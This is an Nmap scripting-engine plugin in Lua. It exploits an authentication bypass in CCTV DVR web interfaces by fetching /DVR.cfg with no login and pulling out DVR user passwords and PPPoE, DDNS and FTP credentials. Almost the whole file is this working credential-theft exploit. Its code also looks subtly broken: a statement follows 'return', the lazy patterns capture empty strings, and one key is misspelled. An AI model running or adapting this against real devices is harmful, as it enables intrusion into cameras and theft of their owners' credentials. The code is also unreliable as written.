local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[Retrieves credentials by using an authentication bypass vulnerability in
  cctv dvr installations.

  This script makes use of authentication bypass vulnerabilites in the web interface of
  cctv dvr installations, which allows retrieval of device configuration. Once the file
  has been retrieved it is parsed for ppoe, ddns, ftp and other credentials.
]]

---
-- @usage nmap --script cctv-auth-bypass <target>
--
-- @args
--
-- @output
--

author = "Gyanendra Mishra"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"vuln", "intrusive"}

portrule = shortport.http

local function get_dvr_creds(conf)
  local output = {}
  for userid in conf:gmatch("USER(%d+)_USERNAME") do
    output[userid] = {}
    output[userid]["active"] = conf:match("USER" .. userid .. "_LOGIN=(.-)")
    output[userid]["user"] = conf:match("USER" .. userid .. "_USERNAME=(.-)")
    output[userid]["password"] = conf:match("USER" .. userid .. "_PASSWORD=(.-)")
  end
  if next(output) then return true, output else return false end
end

local function get_creds(conf, patterns)
  if patterns["enabled"] then
    local enabled = conf:match(patterns["enabled"])
    if enabled == "0" then return false end
    patterns["enabled"] = nil
  end

  local output = {}
  for name, pattern in pairs(patterns) do
    output[name] = conf:match(pattern)
  end

  if next(output) then
    return true, output
  else
    return false
  end
end

local checks = {
  ["ppoe"] = {
    ["enabled"] = "PPPOE_EN=(%d)",
    ["user"] = "PPPOE_USER=(.-)",
    ["password"] = "PPOE_PASSWORD=(.-)",
  },
  ["ddns"] = {
    ["enabled"] = "DDNS_EN=(%d)",
    ["user"] = "DDNS_USER=(.-)",
    ["password"] = "DDNS_PASSWORD=(.-)",
    ["hostname"] = "DDNS_HOSTNAME=(.-)",
  },
  ["ftp"] = {
    ["server"] = "FTP_SERVER=(.-)",
    ["user"] = "FTP_USER=(.-)",
    ["password"] = "FTP_PASSWORD=(.-)",
    ["port"] = "FTP_PORT=(.-)",
  },
}

action = function(host, port)

  local response = http.get(host, port, "/DVR.cfg")
  local result = stdnse.output_table()
  local output, status = {}

  if response and response.status == 200 then

    for type, check in pairs(checks) do
      status, output = get_creds(response.body, check)
      if status then
        result[type] = output
      else
        stdnse.debug("Couldn't Find Creds for %s", type)
      end
    end
    status, output = get_dvr_creds(response.body)
    if status then
      result["DVR Credentials"] = output
    else
      stdnse.debug("No Credentials Found")
    end
  else
    return
    stdnse.debug("DVR Configuration Not found.")
  end

  if next(result) then
    return result
  end

end